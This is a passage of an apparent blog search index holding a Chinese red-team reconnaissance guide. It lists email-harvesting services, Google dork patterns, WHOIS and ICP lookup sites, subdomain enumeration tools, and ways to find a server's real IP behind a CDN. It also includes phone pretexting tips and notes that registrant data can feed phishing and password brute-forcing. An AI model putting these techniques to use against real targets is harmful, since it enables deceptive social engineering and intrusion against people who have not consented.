3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#在线搜索邮件"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#theharvester"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 性格分析工具（使用相同或相似分析后判断是否有可能是同公司的） 收集目标网站信息构造文件内容（批量发送邮件验证） Google、必应、百度浏览器搜索相关邮件信息 这里解释一下如上说的一些搜索信息大致分为三类： 第一种：目标单位正在运营的网站，例如官方网站，社交网站等 第二种：保留在第三方网站上的信息，例如用于注册公司信息的网站，行业网站，招聘网站等 第三种：最后一个类别与关键字相关 在这三种类型的网站中，第一类和第二类网站确实有价值 （该公司的官方网站通常可以找到开发历史，主要产品和市场信息。社交网站通常使我们能够找到关键人物的职业信息。第三方网站上的信息通常使我们能够找到有关公司的更深入的信息，例如资产净值，公司的业务状况和员工人数。展示的信息。） Bloomberg 是专门用于查询公司信息的网站 whois 适合查询个人注册的公司、历史快照、从Bloomberg 相关关键人员信息 通过网站的通用联系表单和邮箱。 **PS：**通常，邮件接收人会猜你是不是有重要的事，然后又因为他跟你的目标人基本无利益冲突，很可能会热心的帮你这个忙。 验证邮箱真假（https://www.mail-verifier.com/ （邮箱侦探 验证电子邮件地址有效性!）、https://verify-email.org/ （核实邮件）、https://www.emailcamel.com （批量验证收费）） · SKYPE 工具使用 “一个” 直接使用SKYPE查找客户 （1）使用产品关键字在SKYPE中搜索客户（当前正在与客户聊天！） （2）使用行业名称在SKYPE中搜索客户 （3）搜索之后，在SKYPE个人资料图片中使用客户的SKYPE名称，昵称，信息和客户的公司LOGO来过滤和添加客户 “两个” 使用客户查询信息来搜索客户的SKYPE （1）在SKYPE中搜索客户网站名称（在www之后和点之前） （2）使用客户电子邮件@前content在SKYPE中搜索 （3）使用客户名称在SKYPE中搜索。 （4）使用客户公司名称在SKYPE中搜索 “三” 将客户的邮箱放在Skype上进行搜索，然后可以搜索客户的Skype ID，以便您可以及时与客户在线聊天。（当前，使用此方法搜索有较大意图的先前客户） 分类目标单位类型· 外贸或类似食品类型 1）展览客户-展览将遇到一些新客户，通过交流和网站调查，可以确定一些精确的买家。 2）B2B查询-通过分析查询客户，可以确定一些精确的买家。 3）海关数据通过关键字搜索+数据分析，您可以找到与自己公司实力相匹配的准确买家。 4）公司名称和联系方式放在LinkedIn、Facebook等国外社交媒体平台上进行搜索 3）猜测邮箱姓、名等地址：metricsparrow.com/toolkit/email-permutator 4）谷歌指定搜索，例如名称 假设对方叫做Ken Lyons，可利用的谷歌搜索指令如下： ● site:companywebsite.com + ken.lyons [at] companyname.com ● site:companywebsite.com + kenlyons [at] companyname.com ● site:companywebsite.com + klyons [at] companyname.com ● site:companywebsite.com + ken [at] companyname.com ● site:companywebsite.com + ken_lyons [at] companyname.com ● site:WEBSITE.com+[name]+email ● site:WEBSITE.com+[name]+contact ● NAME email ● NAME contact ● “FIRSTNAME LASTNAME” email ● “FIRSTNAME LASTNAME” contact 5）利用the Harvester 可以查找电子邮箱和子域名 6）使用Pipl查找 7）外贸搜（waimaosou.com） 鹰眼搜（yingyanso.cn） 微匹（veryvp.com） 类似微匹搜索的网站（email-format.com） skymem搜索邮箱（skymem） 8）邮件反查工具（懒得工具） 9）知道客户和国家/地区的全名，通过此URL查询客户信息（peoplelooker、beenverified） 10）探测邮箱（免费） 11）www.emailgo.cn进行注册。您只能输入URL，找到邮箱，并找到更多，更完整和可靠的邮箱。 12）www.email-format.com，无需注册。 13）emailhunter.co，如果您要注册，每个月丢失网站地址只能找到150个电子邮件地址。 14）www.yingyanso.com，要注册，有客户端下载，客户端电子邮件结果比较完整，搜索URL或产品名称查找电子邮件. 15）teemo扫描工具（提莫） 16）www.mingluji.com 名录集 17）buyerinfo.biz.cutestat.com 世界买家网 18）谷歌地图搜索，搜索邮箱 www.52wmb.com www.365trade.com.cn cn.panjiva.com 19）领英、脉脉、陌陌、youtube、twitter、pinterest、google+,vk,tumblr等国外社交网站发布产品 20）istagram 国外社交软件搜索邮箱 21）Snovio 自动化搜索邮箱（免费试用） 22）中国制造，环球资源，环球资源、tradekey等等B2B平台，搜索邮箱 23）souyouxiang.com 搜邮箱 24）常用外贸B2B Global Sources、Alibaba、Kompass、Aliexpress、Globalimporter、hktdc、Eworldtrade、Mytradezone、Dhgate 25）常用外贸搜索 Google、Yahoo、who.is、商务部买家数据、海关及海关数据、Icanopen、Thomasnet、Kellysearch、Ezilon、Ask 26）中国(中国最有影响力搜索引擎、中国最有影响力B2B网站、中国本国黄页网站、中国国家政府官方经典对外经贸网站、中国新闻信息网站、中国银行证券网站、中国相关信息网站) https://www.b2bwz.com/guobie/yazhou/china.htm 27）谷歌邮箱插件 28）邮箱工具 http://www.qunfa158.com/software-email-search 29）谷歌查找 公司名称+ Google查找电子邮件 公司地址+ Google查找电子邮件 公司网站+ Google查找客户 公司电话+ Google查找客户 http://www.qunfa158.com/software-email-search 30）软件（网络登录）—猎人 名称：hunter.io 功能：按域名查找邮箱，使用非KP邮箱（如INFO） 用法：可以找到相应的来源 31）软件（网络登录） 名称：connect.data.com 功能：免费账户可以查询2家公司的邮箱，邮箱的信誉还可以 用法： ​ 1）支付或上传数据以换取积分 ​ 2）电子邮件验证需要时间 32）海关数据 外贸数据（https://www.52wmb.com/） 出口贸易（http://www.e8t.com/information/） 33）电话联系以获取电子邮件 用法： a. 直接联系老板进行沟通（中小企业直接与老板沟通），获取对方的邮箱 b. 如果老板不在等，请向收件人询问电子邮件地址 提示：通知被叫人紧急情况或作为买方查询老板的电子邮件地址；检查与被叫方的老板电子邮件地址（按照1a，询问他的邮箱是否错误并被退回） c. 致电公司销售人员获取其电子邮件地址，然后以电子邮件格式插入相应的联系人姓名。或与他们核对联系电子邮件是否有问题。 d. 如果以上b或c方法均不能确认Boss邮箱，请找一名管理人员并告知他们订单信息已发送给Sales和Boss，但Boss邮箱将","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:6","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#验证账户有效性"},{"categories":["hvv"],"content":"\r0x07 Whois 查询通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。 名称 地址 站长之家域名WHOIS信息查询地址 http://whois.chinaz.com/ 爱站网域名WHOIS信息查询地址 https://whois.aizhan.com/ 腾讯云域名WHOIS信息查询地址 https://whois.cloud.tencent.com/ 美橙互联域名WHOIS信息查询地址 https://whois.cndns.com/ 爱名网域名WHOIS信息查询地址 https://www.22.cn/domain/ 易名网域名WHOIS信息查询地址 https://whois.ename.net/ 中国万网域名WHOIS信息查询地址 https://whois.aliyun.com/ 西部数码域名WHOIS信息查询地址 https://whois.west.cn/ 新网域名WHOIS信息查询地址 http://whois.xinnet.com/domain/whois/index.jsp 纳网域名WHOIS信息查询地址 http://whois.nawang.cn/ 中资源域名WHOIS信息查询地址 https://www.zzy.cn/domain/whois.html 三五互联域名WHOIS信息查询地址 https://cp.35.com/chinese/whois.php 新网互联域名WHOIS信息查询地址 http://www.dns.com.cn/show/domain/whois/index.do 国外WHOIS信息查询地址 https://who.is/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:7","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x07-whois-查询"},{"categories":["hvv"],"content":"\r0x08 在线网站备案查询 名称 地址 小蓝本 https://www.xiaolanben.com/ 天眼查 https://www.tianyancha.com/ ICP备案查询网 http://www.beianbeian.com/ 爱站备案查询 https://icp.aizhan.com 域名助手备案信息查询 http://cha.fute.com/index 企查查 https://www.qcc.com/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:8","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x08-在线网站备案查询"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x09-查找真实ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 